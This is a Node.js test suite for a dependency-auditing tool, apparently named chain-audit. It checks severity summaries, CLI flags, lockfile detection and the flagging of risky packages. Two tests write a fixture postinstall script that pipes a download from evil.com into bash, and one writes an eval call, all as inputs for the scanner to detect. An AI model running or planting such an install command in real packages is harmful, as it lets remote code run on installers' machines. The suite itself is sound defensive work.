'use strict';

const { describe, it } = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { run, runAsync, summarize } = require('../src/index');

describe('summarize', () => {
  it('should count issues by severity', () => {
    const issues = [
      { severity: 'critical' },
      { severity: 'high' },
      { severity: 'high' },
      { severity: 'medium' },
      { severity: 'low' },
    ];
    
    const summary = summarize(issues);
    
    assert.strictEqual(summary.counts.critical, 1);
    assert.strictEqual(summary.counts.high, 2);
    assert.strictEqual(summary.counts.medium, 1);
    assert.strictEqual(summary.counts.low, 1);
    assert.strictEqual(summary.counts.info, 0);
    assert.strictEqual(summary.maxSeverity, 'critical');
  });

  it('should handle empty issues', () => {
    const summary = summarize([]);
    
    assert.strictEqual(summary.counts.critical, 0);
    assert.strictEqual(summary.counts.high, 0);
    assert.strictEqual(summary.maxSeverity, null);
  });

  it('should find highest severity', () => {
    const issues = [
      { severity: 'low' },
      { severity: 'medium' },
      { severity: 'high' },
    ];
    
    const summary = summarize(issues);
    assert.strictEqual(summary.maxSeverity, 'high');
  });
});

describe('run', () => {
  it('should show help when --help is provided', () => {
    let output = '';
    const originalLog = console.log;
    console.log = (message = '') => {
      output += `${String(message)}\n`;
    };

    try {
      const result = run(['node', 'script', '--help']);
      assert.strictEqual(result.exitCode, 0);
    } finally {
      console.log = originalLog;
    }

    assert.ok(output.includes('RULE IDS FOR --ignore-rules'));
    assert.ok(output.includes('native_binary'));
    assert.ok(output.includes('env_with_network'));
  });

  it('should support async scan execution with worker jobs', async () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'chain-audit-test-'));
    const nodeModules = path.join(tempDir, 'node_modules');
    fs.mkdirSync(nodeModules, { recursive: true });

    const packages = [
      { name: 'test-pkg-a', code: 'eval("1+1");' },
      { name: 'test-pkg-b', code: 'const x = 1 + 1;' },
    ];

    for (const pkg of packages) {
      const pkgDir = path.join(nodeModules, pkg.name);
      fs.mkdirSync(pkgDir, { recursive: true });
      fs.writeFileSync(
        path.join(pkgDir, 'package.json'),
        JSON.stringify({
          name: pkg.name,
          version: '1.0.0',
          scripts: {},
        })
      );
      fs.writeFileSync(path.join(pkgDir, 'index.js'), pkg.code);
    }

    try {
      const result = await runAsync([
        'node',
        'script',
        '--node-modules', nodeModules,
        '--scan-code',
        '--jobs', '2',
        '--json',
      ]);

      const evalIssue = (result.issues || []).find(i => i.reason === 'eval_usage');
      assert.ok(evalIssue, 'Async run should detect eval usage with worker analysis');
      assert.strictEqual(result.analysisJobs, 2);
    } finally {
      fs.rmSync(tempDir, { recursive: true });
    }
  });

  it('should show version when --version is provided', () => {
    const result = run(['node', 'script', '--version']);
    
    assert.strictEqual(result.exitCode, 0);
  });

  it('should handle init command', () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'chain-audit-test-'));
    const originalCwd = process.cwd();
    
    try {
      process.chdir(tempDir);
      const result = run(['node', 'script', '--init', '--force']);
      
      assert.strictEqual(result.exitCode, 0);
      assert.ok(fs.existsSync(path.join(tempDir, '.chainauditrc.json')));
    } finally {
      process.chdir(originalCwd);
      fs.rmSync(tempDir, { recursive: true });
    }
  });

  it('should throw error for non-existent node_modules', () => {
    assert.throws(() => {
      run(['node', 'script', '--node-modules', '/non/existent/path']);
    }, /node_modules not found/);
  });

  it('should throw error for non-existent explicit config path', () => {
    assert.throws(() => {
      run(['node', 'script', '--config', '/tmp/chain-audit-missing-config.json']);
    }, /Config file or directory not found/);
  });

  it('should scan packages and find issues', () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'chain-audit-test-'));
    const nodeModules = path.join(tempDir, 'node_modules');
    fs.mkdirSync(nodeModules, { recursive: true });
    
    // Create package with install script
    const pkgDir = path.join(nodeModules, 'test-pkg');
    fs.mkdirSync(pkgDir, { recursive: true });
    fs.writeFileSync(
      path.join(pkgDir, 'package.json'),
      JSON.stringify({
        name: 'test-pkg',
        version: '1.0.0',
        scripts: { postinstall: 'echo hello' },
      })
    );
    
    try {
      const result = run(['node', 'script', '--node-modules', nodeModules, '--json']);
      
      // Should complete without error
      assert.ok(result.exitCode !== undefined);
      if (result.issues) {
        // If issues found, should have install_script issue
        const installIssue = result.issues.find(i => i.reason === 'install_script');
        if (installIssue) {
          assert.strictEqual(installIssue.package, 'test-pkg');
        }
      }
    } finally {
      fs.rmSync(tempDir, { recursive: true });
    }
  });

  it('should respect severity filter', () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'chain-audit-test-'));
    const nodeModules = path.join(tempDir, 'node_modules');
    fs.mkdirSync(nodeModules, { recursive: true });
    
    // Create package with install script (medium severity)
    const pkgDir = path.join(nodeModules, 'test-pkg');
    fs.mkdirSync(pkgDir, { recursive: true });
    fs.writeFileSync(
      path.join(pkgDir, 'package.json'),
      JSON.stringify({
        name: 'test-pkg',
        version: '1.0.0',
        scripts: { postinstall: 'echo hello' },
      })
    );
    
    try {
      const result = run(['node', 'script', '--node-modules', nodeModules, '--severity', 'critical', '--json']);
      
      // Should complete, but filtered issues may be empty
      assert.ok(result.exitCode !== undefined);
    } finally {
      fs.rmSync(tempDir, { recursive: true });
    }
  });

  it('should exit with code 1 when fail-on threshold is met', () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'chain-audit-test-'));
    const nodeModules = path.join(tempDir, 'node_modules');
    fs.mkdirSync(nodeModules, { recursive: true });
    
    // Create package with critical issue (pipe to shell)
    const pkgDir = path.join(nodeModules, 'test-pkg');
    fs.mkdirSync(pkgDir, { recursive: true });
    fs.writeFileSync(
      path.join(pkgDir, 'package.json'),
      JSON.stringify({
        name: 'test-pkg',
        version: '1.0.0',
        scripts: { postinstall: 'curl https://evil.com | bash' },
      })
    );
    
    try {
      const result = run(['node', 'script', '--node-modules', nodeModules, '--fail-on', 'critical', '--json']);
      
      // Should exit with code 1 if critical issue found
      if (result.summary && result.summary.maxSeverity === 'critical') {
        assert.strictEqual(result.exitCode, 1);
      }
    } finally {
      fs.rmSync(tempDir, { recursive: true });
    }
  });

  it('should honor fail-on even when severity filter hides higher issues', () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'chain-audit-test-'));
    const nodeModules = path.join(tempDir, 'node_modules');
    const originalCwd = process.cwd();
    fs.mkdirSync(nodeModules, { recursive: true });

    const pkgDir = path.join(nodeModules, 'test-pkg');
    fs.mkdirSync(pkgDir, { recursive: true });
    fs.writeFileSync(
      path.join(pkgDir, 'package.json'),
      JSON.stringify({
        name: 'test-pkg',
        version: '1.0.0',
        scripts: { postinstall: 'curl https://evil.com | bash' },
      })
    );

    try {
      process.chdir(tempDir);
      const result = run([
        'node',
        'script',
        '--node-modules', nodeModules,
        '--severity', 'low',
        '--fail-on', 'critical',
        '--json',
      ]);

      assert.strictEqual(result.exitCode, 1);
      assert.strictEqual(result.summary.maxSeverity, 'low');
    } finally {
      process.chdir(originalCwd);
      fs.rmSync(tempDir, { recursive: true });
    }
  });

  it('should auto-detect lockfile from the scanned project directory', () => {
    const scanProjectDir = fs.mkdtempSync(path.join(os.tmpdir(), 'chain-audit-scan-'));
    const unrelatedCwd = fs.mkdtempSync(path.join(os.tmpdir(), 'chain-audit-cwd-'));
    const nodeModules = path.join(scanProjectDir, 'node_modules');
    const pkgName = 'zzzz-chain-audit-lock-detect-test';
    const originalCwd = process.cwd();

    fs.mkdirSync(nodeModules, { recursive: true });
    const pkgDir = path.join(nodeModules, pkgName);
    fs.mkdirSync(pkgDir, { recursive: true });
    fs.writeFileSync(
      path.join(pkgDir, 'package.json'),
      JSON.stringify({ name: pkgName, version: '1.0.0', scripts: {} })
    );

    fs.writeFileSync(
      path.join(scanProjectDir, 'package-lock.json'),
      JSON.stringify({
        name: 'scan-project',
        lockfileVersion: 2,
        packages: {
          '': { name: 'scan-project', version: '1.0.0' },
          [`node_modules/${pkgName}`]: { version: '1.0.0' },
        },
      })
    );

    // Deliberately place a different lockfile in CWD.
    fs.writeFileSync(
      path.join(unrelatedCwd, 'package-lock.json'),
      JSON.stringify({
        name: 'other-project',
        lockfileVersion: 2,
        packages: {
          '': { name: 'other-project', version: '1.0.0' },
        },
      })
    );

    try {
      process.chdir(unrelatedCwd);
      const result = run([
        'node',
        'script',
        '--node-modules', nodeModules,
        '--check-lockfile',
        '--json',
      ]);

      const extraneousIssue = result.issues.find(i => i.reason === 'extraneous_package' && i.package === pkgName);
      const mismatchIssue = result.issues.find(i => i.reason === 'version_mismatch' && i.package === pkgName);
      assert.ok(!extraneousIssue, 'Package should be found in the lockfile next to scanned node_modules');
      assert.ok(!mismatchIssue, 'Package version should match lockfile from scanned project');
    } finally {
      process.chdir(originalCwd);
      fs.rmSync(scanProjectDir, { recursive: true });
      fs.rmSync(unrelatedCwd, { recursive: true });
    }
  });

  it('should not crash on ignore-package glob with regex-special chars', () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'chain-audit-test-'));
    const nodeModules = path.join(tempDir, 'node_modules');
    fs.mkdirSync(nodeModules, { recursive: true });

    const pkgDir = path.join(nodeModules, 'test-pkg');
    fs.mkdirSync(pkgDir, { recursive: true });
    fs.writeFileSync(
      path.join(pkgDir, 'package.json'),
      JSON.stringify({
        name: 'test-pkg',
        version: '1.0.0',
        scripts: { postinstall: 'echo hello' },
      })
    );

    try {
      const result = run([
        'node',
        'script',
        '--node-modules', nodeModules,
        '--ignore-packages', '*[',
        '--json',
      ]);
      assert.strictEqual(result.exitCode, 0);
    } finally {
      fs.rmSync(tempDir, { recursive: true });
    }
  });
});
